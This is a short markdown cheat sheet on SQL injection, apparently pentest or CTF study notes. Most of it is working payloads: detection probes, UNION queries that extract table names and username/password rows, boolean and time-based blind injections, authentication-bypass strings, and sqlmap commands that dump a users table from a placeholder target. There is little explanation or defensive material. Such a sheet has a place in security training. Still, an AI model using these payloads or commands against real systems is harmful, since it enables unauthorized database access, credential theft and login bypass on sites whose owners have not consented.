# SQL INJECTION

## Core Concept
SQL commands are injected into database queries via unsanitized input.
Goal: read data, bypass authentication, potentially access the filesystem.

## Detection

```
test'         → SQL error in response = vulnerable
test''        → no error = quote is escaped
1 AND 1=1     → true, page renders normally
1 AND 1=2     → false, page reacts differently (boolean-based)
```

## UNION-Based SQLi

### Determine column count
```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--    ← error here = 2 columns
```

### Extract data
```sql
-- List tables
test' UNION SELECT null, table_name FROM information_schema.tables#

-- Columns of a table
test' UNION SELECT null, column_name FROM information_schema.columns WHERE table_name='users'#

-- Data from table
test' UNION SELECT username, password FROM users#
```

Comment syntax by DB:
| DB     | Comment |
|--------|---------|
| MySQL  | `--` or `#` |
| MSSQL  | `--` |
| Oracle | `--` |

## Blind SQLi

### Boolean-based
```sql
' AND 1=1--                                       → page behaves normally
' AND 1=2--                                       → page reacts differently
' AND SUBSTRING((SELECT user()),1,1)='r'--        → extract character by character
```

### Time-based
```sql
'; SLEEP(5)--                  → MySQL (5 sec delay = vulnerable)
'; WAITFOR DELAY '0:0:5'--     → MSSQL
```

## sqlmap

```bash
# List databases
$ sqlmap -u "http://target.com/page?id=1" --dbs

# Tables of a database
$ sqlmap -u "http://target.com/page?id=1" -D dbname --tables

# Dump data
$ sqlmap -u "http://target.com/page?id=1" -D dbname -T users --dump

# With session cookie (if login required)
$ sqlmap -u "http://target.com/page?id=1" --cookie="PHPSESSID=abc123" --dbs

# From Burp request file (right-click → Save item)
$ sqlmap -r request.txt --dbs

# POST request
$ sqlmap -u "http://target.com/login" --data="user=test&pass=test" --dbs

# Blind techniques only
$ sqlmap -u "http://target.com/page?id=1" --technique=BT --dbs
```

## Burp Suite + sqlmap Workflow
1. Burp Suite → Proxy → intercept request
2. Right-click → **Save item** → `request.txt`
3. `sqlmap -r request.txt --dbs`
4. Alternative: send to **Repeater** → test UNION payloads manually

## Auth Bypass
```sql
admin'--
' OR 1=1--
' OR '1'='1'--
```

## Resources
- https://portswigger.net/web-security/sql-injection/cheat-sheet
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
